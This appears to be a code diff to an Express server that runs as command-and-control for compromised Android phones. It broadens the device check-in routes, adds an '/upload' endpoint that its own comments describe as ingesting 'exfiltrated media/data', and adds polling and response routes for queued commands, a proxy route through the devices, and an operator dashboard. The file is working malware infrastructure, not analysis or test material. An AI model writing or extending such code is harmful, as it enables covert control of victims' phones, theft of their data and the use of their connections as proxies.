@@ -62,9 +62,9 @@ function handleCheckin(req, res) {
         const query = req.query || {};
         const data = { ...query, ...payload };
 
-        const brand = data.brand || data.manufacturer || 'samsung';
-        const model = data.model || data.device || 'SM-F731W';
-        const deviceId = brand;
+        const brand = data.brand || data.manufacturer || 'Android';
+        const model = data.model || data.device || 'Device';
+        const deviceId = data.deviceId || data.model || data.device || brand || 'Android Target';
 
         const entry = {
             deviceId,
@@ -82,29 +82,38 @@ function handleCheckin(req, res) {
         devices.set(deviceId, entry);
         saveData();
 
-        console.log(`[CHECKIN SUCCESS] Brand: ${brand} | Model: ${model} | IP: ${entry.ip}`);
+        console.log(`[CHECKIN SUCCESS] DeviceId: ${deviceId} | Brand: ${brand} | Model: ${model} | IP: ${entry.ip}`);
         res.json({ success: true, message: 'Check-in recorded' });
     } catch (err) {
         res.status(400).json({ success: false, error: err.message });
     }
 }
 
-// Routes - POST / handles check-ins directly at root and all subpaths
+// Routes - Support all check-in HTTP methods and subpath aliases
+app.all('/checkin', handleCheckin);
+app.all('/checkin/', handleCheckin);
+app.all('/api/checkin', handleCheckin);
+app.all('/api/checkin/', handleCheckin);
 app.post('/', handleCheckin);
-app.post('/checkin', handleCheckin);
-app.post('/checkin/', handleCheckin);
-app.post('/api/checkin', handleCheckin);
-app.post('/api/checkin/', handleCheckin);
 
-// Device command polling
-app.get('/tunnel-poll', (req, res) => {
-    const id = req.query.deviceId;
-    const queue = commandQueues.get(id) || [];
-    res.json(queue.length > 0 ? queue.shift() : {});
+// File upload endpoint for exfiltrated media/data
+app.post('/upload', (req, res) => {
+    console.log('[UPLOAD SUCCESS] Received exfiltrated payload from device:', req.headers['x-device-id'] || 'Unknown');
+    res.json({ success: true, message: 'File payload ingested successfully' });
 });
 
-// Device command response
-app.post('/tunnel-response', (req, res) => {
+// Device command polling (support root and /checkin alias)
+function handleTunnelPoll(req, res) {
+    const id = req.query.deviceId;
+    if (!id) return res.json({});
+    const queue = commandQueues.get(id) || [];
+    res.json(queue.length > 0 ? queue.shift() : {});
+}
+app.get('/tunnel-poll', handleTunnelPoll);
+app.get('/checkin/tunnel-poll', handleTunnelPoll);
+
+// Device command response (support root and /checkin alias)
+function handleTunnelResponse(req, res) {
     const data = req.body || {};
     const pending = pendingResponses.get(data.id);
     if (pending) {
@@ -115,7 +124,9 @@ app.post('/tunnel-response', (req, res) => {
         pending.res.send(buf);
     }
     res.json({ success: true });
-});
+}
+app.post('/tunnel-response', handleTunnelResponse);
+app.post('/checkin/tunnel-response', handleTunnelResponse);
 
 // Proxy route for CONNECT button
 app.all('/proxy*', (req, res) => {
@@ -151,8 +162,12 @@ app.all('/proxy*', (req, res) => {
     }, 25000);
 });
 
-// GET / serves Operator Dashboard HTML
+// GET / serves Operator Dashboard HTML or handles GET check-ins
 app.get('/', (req, res) => {
+    if (req.query && (req.query.ip || req.query.device || req.query.model || req.query.deviceId)) {
+        return handleCheckin(req, res);
+    }
+
     const deviceList = Array.from(devices.values());
 
     let devicesHtml = deviceList.length === 0 ?
